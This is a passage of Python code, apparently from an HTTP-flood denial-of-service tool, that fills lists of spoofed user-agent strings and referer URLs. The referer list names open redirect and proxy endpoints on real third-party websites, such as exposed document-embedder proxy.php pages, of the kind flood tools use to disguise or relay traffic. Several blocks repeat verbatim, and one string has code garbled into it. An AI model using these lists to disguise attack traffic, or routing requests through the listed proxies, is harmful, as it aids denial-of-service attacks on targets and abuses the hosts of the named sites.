    headers_useragents.append('aranhabot')
    headers_useragents.append('ArchitextSpider')
    headers_useragents.append('archive.org_bot')
    headers_useragents.append(
        'Argus/1.1 (Nutch; http://www.simpy.com/bot.html; feedback at simpy dot com)')
    headers_useragents.append('Arikus_Spider')
    headers_useragents.append(
        'Arquivo-web-crawler (compatible; heritrix/1.12.1 +http://arquivo-web.fccn.pt)')
    headers_useragents.append(
        'asked/Nutch-0.8 (web crawler; http://asked.jp; epicurus at gmail dot com)')
    headers_useragents.append('ASPSeek/1.2.5')
    headers_useragents.append('ASPseek/1.2.9d')
    headers_useragents.append('ASPSeek/1.2.x')
    headers_useragents.append('ASPSeek/1.2.xa')
    headers_useragents.append('ASPseek/1.2.xx')
    headers_useragents.append('ASPSeek/1.2.xxpre')
    headers_useragents.append('ASSORT/0.10')
    headers_useragents.append('asterias/2.0')
    headers_useragents.append(
        'AtlocalBot/1.1 +(http://www.atlocal.com/local-web-site-owner.html)')
    headers_useragents.append('Atomic_Email_Hunter/4.0')
    headers_useragents.append('Atomz/1.0')
    headers_useragents.append('atSpider/1.0')
    headers_useragents.append('Digger/1.0 JDK/1.3.0rc3')
    headers_useragents.append('DigOut4U')
    headers_useragents.append('DIIbot/1.2')
    headers_useragents.append('Dillo/0.8.5-i18n-misc')
    headers_useragents.append('Dillo/0.x.x')
    headers_useragents.append(
        'disastrous/1.0.5 (running with Python 2.5.1; http://www.bortzmeyer.org/disastrous.html; archangel77@del.icio.us)')
    headers_useragents.append('DISCo Pump x.x')
    headers_useragents.append(
        'disco/Nutch-0.9 (experimental crawler; www.discoveryengine.com; disco-crawl@discoveryengine.com)')
    headers_useragents.append(
        'disco/Nutch-1.0-dev (experimental crawler; www.discoveryengine.com; disco-crawl@discoveryengine.com)')
    headers_useragents.append('DittoSpyder')
    headers_useragents.append('dloader(NaverRobot)/1.0')
    headers_useragents.append(
        'DNSRight.com WebBot Link Ckeck Tool. Report abuse to: dnsr@dnsright.com')
    headers_useragents.append('DoCoMo/1.0/Nxxxi/c10')
    headers_useragents.append('DoCoMo/1.0/Nxxxi/c10/TB')
    headers_useragents.append('DoCoMo/1.0/P502i/c10 (Google CHTML Proxy/1.0)')
    headers_useragents.append('DoCoMo/2.0 P900iV(c100;TB;W24H11)')
    headers_useragents.append(
        'DoCoMo/2.0 SH901iS(c100;TB;W24H12))gzip(gfe) (via translate.google.com)')
    headers_useragents.append(
        'DoCoMo/2.0 SH902i (compatible; Y!J-SRD/1.0; http://help.yahoo.co.jp/help/jp/search/indexing/indexing-27.html)')
    headers_useragents.append(
        'DoCoMo/2.0/SO502i (compatible; Y!J-SRD/1.0; http://help.yahoo.co.jp/help/jp/search/indexing/indexing-27.html)')
    headers_useragents.append(
        'DocZilla/1.0 (Windows; U; WinNT4.0; en-US; rv:1.0.0) Gecko/20020804')
    headers_useragents.append('dodgebot/experimental')
    headers_useragents.append('DonutP; Windows98SE')
    headers_useragents.append(
        'Doubanbot/1.0 (bot@douban.com http://www.douban.com)')
    headers_useragents.append('Download Demon/3.x.x.x')
    headers_useragents.append('Download Druid 2.x')
    headers_useragents.append('Download Express 1.0')
    headers_useragents.append('Download Master')
    headers_useragents.append('Download Ninja 3.0')
    headers_useragents.append('Download Wonder')
    headers_useragents.append(
        'Download-Tipp Linkcheck (http://download-tipp.de/)')
    headers_useragents.append(
        'Download.exe(1.1) (+http://www.sql-und-xml.de/freeware-tools/)')
    headers_useragents.append('DownloadDirect.1.0')
    headers_useragents.append(
        'Dr.Web (R) online scanner: http://online.drweb.com/')
    headers_useragents.append('Dragonfly File Reader')
    headers_useragents.append(
        'Drecombot/1.0 (http://career.drecom.jp/bot.html)')
    headers_useragents.append('Drupal (+http://drupal.org/)')
    headers_useragents.append('DSurf15a 01')
    headers_useragents.append('DSurf15a 71')
    headers_useragents.append('DSurf15a 81')
    headers_useragents.append('DSurf15a VA')
    headers_useragents.append('DTAAgent')
    headers_useragents.append('dtSearchSpider')
    headers_useragents.append('Dual Proxy')
    headers_useragents.append(
        'DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)')
    headers_useragents.append('Dumbot(version 0.1 beta - dumbfind.com)')
    headers_useragents.append(
        'Dumbot(version 0.1 beta - http://www.dumbfind.com/dumbot.html)')
    headers_useragents.append('Dumbot(version 0.1 beta)')
    headers_useragents.append(
        'e-sense 1.0 ea(www.vigiltech.com/esensedisclaim.html)')
    headers_useragents.append(
        'e-SocietyRobot(http://www.yama.info.waseda.ac.jp/~yamana/es/)')
    headers_useragents.append(
        'eApolloBot/2.0 (compatible; heritrix/2.0.0-SNAPSHOT-20071024.170148 +http://www.eapollo-opto.com)')
    headers_useragents.append('EARTHCOM.info/1.x [www.earthcom.info]')
    headers_useragents.append('EARTHCOM.info/1.xbeta [www.earthcom.info]')
    headers_useragents.append('EasyDL/3.xx')
    headers_useragents.append('EasyDL/3.xx http://keywen.com/Encyclopedia/Bot')
    headers_useragents.append('EBrowse 1.4b')
    headers_useragents.append('eCatch/3.0')
    headers_useragents.append('EchO!/2.0')
    headers_useragents.append('Educate Search VxB')
    headers_useragents.append(
        'egothor/3.0a (+http://www.xdefine.org/robot.html)')
    headers_useragents.append('EgotoBot/4.8 (+http://www.egoto.com/about.htm)')
    headers_useragents.append('ejupiter.com')
    headers_useragents.append('EldoS TimelyWeb/3.x')
    headers_useragents.append(
        'elfbot/1.0 (+http://www.uchoose.de/crawler/elfbot/)')
    headers_useragents.append(
        'ELI/20070402:2.0 (DAUM RSS Robot) Daum Communications Corp.; +http://ws.daum.net/aboutkr.html)')
    headers_useragents.append('ELinks (0.x.x; Linux 2.4.20 i586; 132x60)')
    headers_useragents.append(
        'ELinks/0.x.x (textmode; NetBSD 1.6.2 sparc; 132x43)')
    headers_useragents.append('EmailSiphon')
    headers_useragents.append('EmailSpider')
    headers_useragents.append('EmailWolf 1.00')
    headers_useragents.append('EmeraldShield.com WebBot')
    headers_useragents.append(
        'EmeraldShield.com WebBot (http://www.emeraldshield.com/webbot.aspx)')
    headers_useragents.append('EMPAS_ROBOT')
    headers_useragents.append(
        'EnaBot/1.x (http://www.enaball.com/crawler.html)')
    headers_useragents.append(
        'endo/1.0 (Mac OS X; ppc i386; http://kula.jp/endo)')
    headers_useragents.append('Enfish Tracker')
    headers_useragents.append('Enterprise_Search/1.0')
    headers_useragents.append('Enterprise_Search/1.0.xxx')
    headers_useragents.append(
        'Enterprise_Search/1.00.xxx;MSSQL (http://www.innerprise.net/es-spider.asp)')
    headers_useragents.append(
        'envolk/1.7 (+http://www.envolk.com/envolkspiderinfo.php)')
    headers_useragents.append(
        'envolk[ITS]spider/1.6(+http://www.envolk.com/envolkspider.html)')
    headers_useragents.append('EroCrawler')
    headers_useragents.append(
        'ES.NET_Crawler/2.0 (http://search.innerprise.net/)')
    headers_useragents.append('eseek-larbin_2.6.2 (crawler@exactseek.com)')
    headers_useragents.append('ESISmartSpider')
    headers_useragents.append(
        'eStyleSearch 4 (compatible; MSIE 6.0; Windows NT 5.0)')
    headers_useragents.append('Firefox (kastaneta03@hotmail.com)')
    headers_useragents.append('Firefox_1.0.6 (kasparek@naparek.cz)')
    headers_useragents.append(
        'FirstGov.gov Search - POC:firstgov.webmasters@gsa.gov')
    headers_useragents.append('firstsbot')
    headers_useragents.append(
        'Flapbot/0.7.2 (Flaptor Crawler; http://www.flaptor.com; crawler at flaptor period com)')
    headers_useragents.append('FlashGet')
    headers_useragents.append('FLATARTS_FAVICO')
    headers_useragents.append('Flexum spider')
    headers_useragents.append('Flexum/2.0')
    headers_useragents.append('FlickBot 2.0 RPT-HTTPClient/0.3-3')
    headers_useragents.append('flunky')
    headers_useragents.append('fly/6.01 libwww/4.0D')
    headers_useragents.append('flyindex.net 1.0/http://www.flyindex.net')
    headers_useragents.append(
        'FnooleBot/2.5.2 (+http://www.fnoole.com/addurl.html)')
    headers_useragents.append('FocusedSampler/1.0')
    headers_useragents.append('Folkd.com Spider/0.1 beta 1 (www.folkd.com)')
    headers_useragents.append(
        'FollowSite Bot ( http://www.followsite.com/bot.html )')
    headers_useragents.append(
        'FollowSite.com ( http://www.followsite.com/b.html )')
    headers_useragents.append(
        'Fooky.com/ScorpionBot/ScoutOut; http://www.fooky.com/scorpionbots')
    headers_useragents.append(
        'Francis/1.0 (francis@neomo.de http://www.neomo.de/)')
    headers_useragents.append('Franklin Locator 1.8')
    headers_useragents.append(
        'free-downloads.net download-link validator /0.1')
    headers_useragents.append(
        'FreeFind.com-SiteSearchEngine/1.0 (http://freefind.com; spiderinfo@freefind.com)')
    headers_useragents.append('Frelicbot/1.0 +http://www.frelic.com/')
    headers_useragents.append('FreshDownload/x.xx')
    headers_useragents.append(
        'FreshNotes crawler< report problems to crawler-at-freshnotes-dot-com')
    headers_useragents.append('FSurf15a 01')
    headers_useragents.append('FTB-Bot http://www.findthebest.co.uk/')
    headers_useragents.append('Full Web Bot 0416B')
    headers_useragents.append('Full Web Bot 0516B')
    headers_useragents.append('Full Web Bot 2816B')
    headers_useragents.append('FuseBulb.Com')
    headers_useragents.append(
        'FyberSpider (+http://www.fybersearch.com/fyberspider.php)')
    headers_useragents.append(
        'unknownght.com Web Server IIS vs Apache Survey. See Results at www.DNSRight.com	headers_useragents.append(')
    headers_useragents.append('factbot : http://www.factbites.com/robots')
    headers_useragents.append('FaEdit/2.0.x')
    headers_useragents.append('FairAd Client')
    headers_useragents.append('FANGCrawl/0.01')
    headers_useragents.append('FARK.com link verifier')
    headers_useragents.append('Fast Crawler Gold Edition')
    headers_useragents.append('FAST Enterprise Crawler 6 (Experimental)')
    headers_useragents.append(
        'FAST Enterprise Crawler 6 / Scirus scirus-crawler@fast.no; http://www.scirus.com/srsapp/contactus/')
    headers_useragents.append(
        'FAST Enterprise Crawler 6 used by Cobra Development (admin@fastsearch.com)')
    headers_useragents.append(
        'FAST Enterprise Crawler 6 used by Comperio AS (sts@comperio.no)')
    headers_useragents.append('FAST Enterprise Crawler 6 used by FAST (FAST)')
    headers_useragents.append(
        'FAST Enterprise Crawler 6 used by Pages Jaunes (pvincent@pagesjaunes.fr)')
    headers_useragents.append(
        'FAST Enterprise Crawler 6 used by Sensis.com.au Web Crawler (search_comments\at\sensis\dot\com\dot\au)')
    headers_useragents.append(
        'FAST Enterprise Crawler 6 used by Singapore Press Holdings (crawler@sphsearch.sg)')
    headers_useragents.append(
        'FAST Enterprise Crawler 6 used by WWU (wardi@uni-muenster.de)')
    headers_useragents.append('FAST Enterprise Crawler/6 (www.fastsearch.com)')
    headers_referers.append('http://www.bing.com/search?q=')
    headers_referers.append('https://www.yandex.com/yandsearch?text=')
    headers_referers.append('https://duckduckgo.com/?q=')
    headers_referers.append('http://www.ask.com/web?q=')
    headers_referers.append('http://search.aol.com/aol/search?q=')
    headers_referers.append(
        'https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=')
    headers_referers.append('https://drive.google.com/viewerng/viewer?url=')
    headers_referers.append('http://validator.w3.org/feed/check.cgi?url=')
    headers_referers.append('http://host-tracker.com/check_page/?furl=')
    headers_referers.append(
        'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=')
    headers_referers.append(
        'http://jigsaw.w3.org/css-validator/validator?uri=')
    headers_referers.append('https://add.my.yahoo.com/rss?url=')
    headers_referers.append('http://www.google.com/?q=')
    headers_referers.append('http://www.google.com/?q=')
    headers_referers.append('http://www.google.com/?q=')
    headers_referers.append('http://www.usatoday.com/search/results?q=')
    headers_referers.append('http://engadget.search.aol.com/search?q=')
    headers_referers.append('https://steamcommunity.com/market/search?q=')
    headers_referers.append('http://filehippo.com/search?q=')
    headers_referers.append(
        'http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
    headers_referers.append('http://eu.battle.net/wow/en/search?q=')
    headers_referers.append('http://engadget.search.aol.com/search?q=')
    headers_referers.append('http://careers.gatesfoundation.org/search?q=')
    headers_referers.append('http://techtv.mit.edu/search?q=')
    headers_referers.append('http://www.ustream.tv/search?q=')
    headers_referers.append('http://www.ted.com/search?q=')
    headers_referers.append('http://funnymama.com/search?q=')
    headers_referers.append('http://itch.io/search?q=')
    headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
    headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
    headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
    headers_referers.append('https://play.google.com/store/search?q=')
    headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
    headers_referers.append('http://www.reddit.com/search?q=')
    headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
    headers_referers.append(
        'https://careers.carolinashealthcare.org/search?q=')
    headers_referers.append('http://jobs.leidos.com/search?q=')
    headers_referers.append('http://jobs.bloomberg.com/search?q=')
    headers_referers.append('https://www.pinterest.com/search/?q=')
    headers_referers.append('http://millercenter.org/search?q=')
    headers_referers.append('https://www.npmjs.com/search?q=')
    headers_referers.append('http://www.evidence.nhs.uk/search?q=')
    headers_referers.append('http://www.shodanhq.com/search?q=')
    headers_referers.append('http://ytmnd.com/search?q=')
    headers_referers.append('http://www.google.com/?q=')
    headers_referers.append('http://www.google.com/?q=')
    headers_referers.append('http://www.google.com/?q=')
    headers_referers.append('http://www.usatoday.com/search/results?q=')
    headers_referers.append('http://engadget.search.aol.com/search?q=')
    headers_referers.append('https://steamcommunity.com/market/search?q=')
    headers_referers.append('http://filehippo.com/search?q=')
    headers_referers.append(
        'http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
    headers_referers.append('http://eu.battle.net/wow/en/search?q=')
    headers_referers.append('http://engadget.search.aol.com/search?q=')
    headers_referers.append('http://careers.gatesfoundation.org/search?q=')
    headers_referers.append('http://techtv.mit.edu/search?q=')
    headers_referers.append('http://www.ustream.tv/search?q=')
    headers_referers.append('http://www.ted.com/search?q=')
    headers_referers.append('http://funnymama.com/search?q=')
    headers_referers.append('http://itch.io/search?q=')
    headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
    headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
    headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
    headers_referers.append('https://play.google.com/store/search?q=')
    headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
    headers_referers.append('http://www.reddit.com/search?q=')
    headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
    headers_referers.append(
        'https://careers.carolinashealthcare.org/search?q=')
    headers_referers.append('http://jobs.leidos.com/search?q=')
    headers_referers.append('http://jobs.bloomberg.com/search?q=')
    headers_referers.append('https://www.pinterest.com/search/?q=')
    headers_referers.append('http://millercenter.org/search?q=')
    headers_referers.append('https://www.npmjs.com/search?q=')
    headers_referers.append('http://www.evidence.nhs.uk/search?q=')
    headers_referers.append('http://www.shodanhq.com/search?q=')
    headers_referers.append('http://ytmnd.com/search?q=')
    headers_referers.append('http://www.google.com/?q=')
    headers_referers.append('http://www.google.com/?q=')
    headers_referers.append('http://www.google.com/?q=')
    headers_referers.append('http://www.usatoday.com/search/results?q=')
    headers_referers.append('http://engadget.search.aol.com/search?q=')
    headers_referers.append('https://steamcommunity.com/market/search?q=')
    headers_referers.append('http://filehippo.com/search?q=')
    headers_referers.append(
        'http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
    headers_referers.append('http://eu.battle.net/wow/en/search?q=')
    headers_referers.append('http://engadget.search.aol.com/search?q=')
    headers_referers.append('http://careers.gatesfoundation.org/search?q=')
    headers_referers.append('http://techtv.mit.edu/search?q=')
    headers_referers.append('http://www.ustream.tv/search?q=')
    headers_referers.append('http://www.ted.com/search?q=')
    headers_referers.append('http://funnymama.com/search?q=')
    headers_referers.append('http://itch.io/search?q=')
    headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
    headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
    headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
    headers_referers.append('https://play.google.com/store/search?q=')
    headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
    headers_referers.append('http://www.reddit.com/search?q=')
    headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
    headers_referers.append(
        'https://careers.carolinashealthcare.org/search?q=')
    headers_referers.append('http://jobs.leidos.com/search?q=')
    headers_referers.append('http://jobs.bloomberg.com/search?q=')
    headers_referers.append('https://www.pinterest.com/search/?q=')
    headers_referers.append('http://millercenter.org/search?q=')
    headers_referers.append('https://www.npmjs.com/search?q=')
    headers_referers.append('http://www.evidence.nhs.uk/search?q=')
    headers_referers.append('http://www.shodanhq.com/search?q=')
    headers_referers.append('http://ytmnd.com/search?q=')
    headers_referers.append('http://www.google.com/?q=')
    headers_referers.append('http://www.google.com/?q=')
    headers_referers.append('http://www.google.com/?q=')
    headers_referers.append('http://www.usatoday.com/search/results?q=')
    headers_referers.append('http://engadget.search.aol.com/search?q=')
    headers_referers.append('https://steamcommunity.com/market/search?q=')
    headers_referers.append('http://filehippo.com/search?q=')
    headers_referers.append(
        'http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
    headers_referers.append('https://validator.w3.org/nu/?doc=')
    headers_referers.append(
        'https://www.cia.gov/redirects/ciaredirect.html?page=')
    headers_referers.append('http://www.babalweb.net/ar/open.php?url=')
    headers_referers.append('http://translate.google.com/translate?u=')
    headers_referers.append('http://check-host.net/check-http?host=')
    headers_referers.append('https://www.ivrr.de/proxy.php?url=')
    headers_referers.append('https://www.eliotours.es/viajes/proxy.php?url=')
    headers_referers.append(
        'http://engagethepower.org/wp-content/plugins/google-document-embedder/proxy.php?url=')
    headers_referers.append('http://proxy.g0v.ronny.tw/proxy.php?url=')
    headers_referers.append(
        'https://www.djcavallino.lu/rapidviewer-2/files/proxy.php?url=')
    headers_referers.append('https://www.pingsitemap.com/?action=submit&url=')
    headers_referers.append(
        'https://www.admotoscana.it/wp-content/plugins/google-document-embedder/proxy.php?url=')
    headers_referers.append(
        'https://jaxnetworksolutions.com/pages/wp-content/plugins/google-document-embedder/proxy.php?url=')
    headers_referers.append(
        'https://business.louisville.edu/cob-it-blog/wp-content/plugins/google-document-embedder/proxy.php?url=')
    headers_referers.append('https://mylekis.wip.lt/redirect.php?url=')
    headers_referers.append(
        'https://whittingtoncreek.org/content/wp-content/plugins/google-document-embedder/proxy.php?url=')
    headers_referers.append(
        'http://vision-r.eu/wp-content/plugins/google-document-embedder/proxy.php?url=')
    headers_referers.append(
        'http://swietokrzyskie.travel/en/_formularze/polec_znajomemu.html?url=')
    headers_referers.append('http://staustell.inuklocal.co.uk/eu.aspx?url=')
    headers_referers.append(
        'http://stavrakoudis.econ.uoi.gr/stavrakoudis/related_link.php?url=')
    headers_referers.append(
        'http://steelhorse.tv/assets/engine/swf/player.swf?url=')
    headers_referers.append('http://steffens-consulting.net/link.php?url=')
    headers_referers.append('http://stelsmotors.by/import/?url=')
    headers_referers.append('http://stepney.inuklocal.co.uk/eu.aspx?url=')
    headers_referers.append(
        'http://stimaengenharia.com.br/ingles/conteudo_email.asp?url=')
    headers_referers.append(
        'http://stitchkin.cl/forms/form_13.php?proyecto_id=&url=')
    headers_referers.append(
        'http://stitchkin.cl/forms/form_13.php?proyecto_id=16eceb2b6ff9cc848cf3b2eec491629e&url=')
    headers_referers.append(
        'http://stitchkin.cl/forms/form_13.php?proyecto_id=7af686453dcb1ea7f3ef14de02fd2bd7&url=')
    headers_referers.append('http://stnw.nhtsa.gov/exit.cfm?link=')
    headers_referers.append(
        'http://stomatolog61.pro/mibew/client.php?locale=ru&style=default&url=')
    headers_referers.append(
        'http://stop-list.info/go?http://www.cyberwebsearch.com/?url=')
    headers_referers.append('http://stream.thatmustbe.us/?url=')
    headers_referers.append('http://strictly.dewww.strictly.de/exit/?url=')
    headers_referers.append('http://stripestechnologies.com/link.asp?okokok=')
    headers_referers.append('http://stroy-forum.pro/redirect/?url=')
    headers_referers.append(
        'http://students.curtin.edu.au/s/cache?collection=curtin-edu-au-web&doc=funnelback-web-crawl.warc&off=14120276&len=3320&url=')
    headers_referers.append('http://studmed.unibe.ch/iphone/owa.php?url=')
    headers_referers.append('http://studyonline.ca/partners.php?url=')
    headers_referers.append('http://sulma.ge/go.php?url=')
    headers_referers.append(
        'http://summerschool.univ-paris-est.fr/servlet/com.kportal.pdf.PDFServlet?URL=')
    headers_referers.append(
        'http://suomenmoneta.fi/rahakotelo-volterra-quattro-de-luxe-390?url=')
    headers_referers.append(
        'http://suomenmoneta.fi/viisiosainen-rahojen-hoitosarja?url=')
    headers_referers.append('http://suppon.club/rank.cgi?mode=link&id=24&url=')
    headers_referers.append('http://surl.me/?url=')
    headers_referers.append(
        'http://suzuki.saikyou.biz/rank.cgi?mode=link&id=5&url=')
    headers_referers.append(
        'http://suzukicars.info/indianer/indianer-tattoo-dateigroesse-450x600-url-http-www-picture.html')
    headers_referers.append(
        'http://svc.cruzeirodosul.inf.br/assinatura/form_assinante.phl?url=')
    headers_referers.append('http://svgur.com/dweb?url=')
    headers_referers.append(
        'http://svit.of.by/webim/client.php?locale=ru&url=')
    headers_referers.append('http://swet.cf/bbs/login.php?wr_id=3160&url=')
    headers_referers.append('http://swet.cf/bbs/login.php?wr_id=58&url=')
    headers_referers.append(
        'http://swietokrzyskie.travel/en/_formularze/polec_znajomemu.html?url=')
    headers_referers.append(
        'http://swissmarketingacademy.ch/wp-json/oembed/1.0/embed?format=xml&url=')
    headers_referers.append('http://swisstld.ch/tldreview/redirect.php?url=')
    headers_referers.append('http://t.globalreport.org/r?fa=6986&url=')
    headers_referers.append('http://t.m.youth.cn/?url=')
    headers_referers.append('http://t.umblr.com/redirect?z=')
    headers_referers.append(
        'http://tabapitanga.com.br/idiomas/setidioma.php?idioma=en&url=')
    headers_referers.append(
        'http://targeting.voxus.tv/master.html?website_id=emporiodacerveja&url=')
    headers_referers.append(
        'http://tcaabudhabi.ae/en/press.centre/Pages/fancyboxpage.aspx?type=image&url=')
    headers_referers.append(
        'http://tdblog.es/TD_Recursos/technology/Redireccion/redir_letsbonus.php?soporte=2151359&program_id=196182&tduid=6bb5f859f4a533ca3ed57ef0ec539f92&url=')
    headers_referers.append('http://tds.glos.us/thredds/view/idv.jnlp?url=')
    headers_referers.append(
        'http://teachengineering.net/view_activity.php?url=')
    headers_referers.append(
        'http://teachengineering.us/view_activity.php?url=')
    headers_referers.append(
        'http://teatro.persinsala.it/stats/link_logger.php?url=')
    headers_referers.append(
        'http://teatrprod.by/webim/client.php?locale=ru&url=')
    headers_referers.append('http://techdoc.netsoftlab.ca/hcount.php?url=')
    headers_referers.append('http://technet.idnes.cz/redir.aspx?url=')
    headers_referers.append(
        'http://teensexmania.tv/go.php?track=cBBMf3tMKmlDdEYE&url=')
    headers_referers.append('http://tehsila.by/katalog/benzogeneratory?url=')
    headers_referers.append('http://tekstil.cf/go.php?url=')
    headers_referers.append('http://tele-wall.com/redirect/?url=')
    headers_referers.append('http://telesputnik.ee/send_friend.php?url=')
    headers_referers.append(
        'http://telford-shropshire.inuklocal.co.uk/eu.aspx?url=')
    headers_referers.append('http://temizlikfirmalari.ga/go.php?url=')
    headers_referers.append('http://temp.becosoft.be/site/error.php?url=')
    headers_referers.append('http://tera18.view.gs/rank/go.cgi?id=deaihi&url=')
    headers_referers.append('http://tervishoid.depile.ee/popup.php?url=')
    headers_referers.append('http://test.bankibel.by/iframe/show?url=')
    headers_referers.append(
        'http://tetracom.quu.cc/yomi-search/rank.cgi?mode=link&id=5584&url=')
    headers_referers.append('http://tevdev.adventgx.com/redirect.asp?url=')
    headers_referers.append(
        'http://th.gundam.info/commons/js/iframe_campaign.jsp?campaignId=19&url=')
    headers_referers.append(
        'http://the-sun.on.cc/js/v5/iframe_ysm_utf8.html?size=wider&key=news&url=')
    headers_referers.append(
        'http://theaosr.org/bbs/link.html?code=news&number=35&url=')
    headers_referers.append(
        'http://theatronostimies.gr/wp-content/plugins/wordpress-social-ring//includes/share.php?url=')
    headers_referers.append(
        'http://thegreatbritishlist.co.uk/api/clickthrough.php?type=banner&id=128&url=')
    headers_referers.append(
        'http://thegreatbritishlist.co.uk/api/clickthrough.php?type=business&id=169&url=')
    headers_referers.append('http://theoccult.bz/redir.php?url=')
    headers_referers.append('http://thesituation.org/redirect.do?url=')
    headers_referers.append(
        'http://thisoldcode.net/ct.ashx?id=544a6f93-928d-4135-9dc3-1f3aaa1ecb87&url=')
    headers_referers.append('http://ti.xdf.cn/Redirect?url=')
    headers_referers.append(
        'http://tic.cheb.cz/EN/vismo/ZaslatEmailem.asp?strTitle=Home+Page&url=')
    headers_referers.append('http://tigernews.co/lang-frontend?url=')
    headers_referers.append(
        'http://tikiwiki.belstar.com.cn/14.x/tiki-view_cache.php?url=')
    headers_referers.append(
        'http://tim.mackey.ie/ct.ashx?id=b9184d35-b02d-4ffb-a363-7a0743263e4a&url=')
    headers_referers.append('http://tima007.mow.fm/go.php?url=')
    headers_referers.append('http://timesascent.com/externalLink?url=')
    headers_referers.append(
        'http://tinhduc4u.info/wp-content/themes/pinboard/includes/sharrre.php?url=')
    headers_referers.append(
        'http://tistory.bluemarble.travel/like/?uid=326160_606&sc=201%2CblogId_326160&url=')
    headers_referers.append('http://tlgconference.org/redirect.aspx?url=')
    headers_referers.append(
        'http://tom.365-photowallwww.talkreviews.cn/dft.cpaugustya.co.jpwp201202http:url=')
    headers_referers.append(
        'http://tomicic.de/ct.ashx?id=a9bbf616-aec6-427e-9bb1-e2fa07930eb4&url=')
    headers_referers.append('http://tont.ee/scount/?url=')
    headers_referers.append('http://tool.www.viruss.eu/redirect.php?url=')
    headers_referers.append('http://tools.by/download/dlcount.php?url=')
    headers_referers.append('http://tools.vzdelani.cz/presmerovani.php?url=')
    headers_referers.append('http://topys.cn/ad?url=')
    headers_referers.append('http://tottenham.inuklocal.co.uk/eu.aspx?url=')
    headers_referers.append(
        'http://toyotomi.cl/bun2sdental/rewriting/index?SITE_CODE=komi&url=')
    headers_referers.append('http://tracker.keymedia.com.au/?id=7820&url=')
    headers_referers.append('http://tracker.xlnow.net/r.asp?m=156&p=1&url=')
    headers_referers.append(
        'http://tracking.dsmmadvantage.com/redirect/Redirection.aspx?url=')
    headers_referers.append(
        'http://tracking.military.com/cgi-bin/outlog.cgi?url=')
    headers_referers.append('http://tracking.shopsmart.xyz/redirect.php?url=')
    headers_referers.append(
        'http://trade.gov/wcm/fragments/fl_tg_outsidelinks/redirect.asp?url=')
    headers_referers.append(
        'http://tradetech-blogi.fi/tag/sahkotoimiset/page/2/?page_id=808&tableId=3&url=')
    headers_referers.append(
        'http://traildevils.ch/Share/Facebook/722316985449c73c810008d22ef165ed/Trail?Title=Gurten%20Trail%20-%20ride%20on!&Url=')
    headers_referers.append('http://travel-egypt.eu/site.php?url=')
    headers_referers.append('http://travel-norway.eu/site.php?url=')
    headers_referers.append(
        'http://traveldaily.com.au/click/redirect.php?url=')
    headers_referers.append('http://travelroutes.eu/site.php?url=')
    headers_referers.append('http://treesearchfarms.biz/site/classic?url=')
    headers_referers.append(
        'http://treiber-forum.at/treiber/weiterleitung.php4?url=')
    headers_referers.append('http://triplify.org/exhibit/?url=')
    headers_referers.append(
        'http://tritalk.co.uk/newslink.php?id=15686&follow=')
    headers_referers.append('http://trk6.df.cl/jump.html?url=')
    headers_referers.append('http://truckeetribe.club/Goto.asp?URL=')
    headers_referers.append('http://truthornot.info/EN/geturl?url=')
    headers_referers.append(
        'http://tumia.org/en/directory/en/instance.php?tiname=')
    headers_referers.append(
        'http://tune.tubidy.im/findmusic/https:%20%20www%20google%20com%20url%20sa=t&source=web&rct=j&url=')
    headers_referers.append(
        'http://turbochargeyourbrand.tv/engine/swf/player.swf?url=')
    headers_referers.append(
        'http://turismo.benicassim.es/ajax/go_to_url_menu_pri.php?idmenu=1&url=')
    headers_referers.append(
        'http://turismo.benicassim.es/ajax/go_to_url_menu_sec.php?idmenu=244&url=')
    headers_referers.append('http://turismo.creatiweb.it/count_url.php?url=')
    headers_referers.append('http://tutka.jyu.fi/tutka/problem?url=')
    headers_referers.append('http://tuttotalenti.it/turismo/redir.asp?url=')
    headers_referers.append('http://tuul.tv/mood/widget.php?url=')
    headers_referers.append(
        'http://typewriterking.info/tiki/tiki-featured_link.php?type=f&url=')
    headers_referers.append(
        'http://u.itux.info/index.php?format=simple&action=shorturl&url=')
    headers_referers.append('http://u670.com/pikamap/textview.php?url=')
    headers_referers.append('http://ubuntu.amstetten.at/pdf2html.php?url=')
    headers_referers.append(
        'http://ucmwww.dnr.state.la.us/ucmsearch/UCMRedir.aspx?url=')
    headers_referers.append(
        'http://ujiapps.uji.es/upo/rest/publicacion/idioma/es?url=')
    headers_referers.append(
        'http://ukrainegirls.sexyi.am/wp-content/plugins/wordpress-social-ring//includes/share.php?url=')
    headers_referers.append(
        'http://umigame.bz/cgi-bin/sm/out.cgi?id=lecrin&url=')
    headers_referers.append('http://unblocked.me/count_hits.php?url=')
    headers_referers.append(
        'http://underarmourrun.gr/wp-admin/customize.php?url=')
    headers_referers.append(
        'http://underthemicroscope.microfisch.com/ct.ashx?id=56c13ed6-10d7-42e8-bfd0-027b492188ac&url=')
    headers_referers.append(
        'http://unia-miest.eu/EN/vismo/ZaslatEmailem.asp?strTitle=About+us&url=')
    headers_referers.append(
        'http://unia-miest.eu/EN/vismo/ZaslatEmailem.asp?strTitle=Final+CITIES+Conference%2C+Dordrecht+-+The+Netherlands%2C+13th+January&url=')
    headers_referers.append('http://unicanews.com.br/page_flip.php?url=')
    headers_referers.append('http://uniton.by/load/url=')
    headers_referers.append('http://untiny.me/?url=')
    headers_referers.append('http://upn.ru/redirect.asp?BID=1430&url=')
    headers_referers.append('http://upn.ru/redirect.aspx?url=')
    headers_referers.append('http://urengoy.pro/go/url=')
    headers_referers.append(
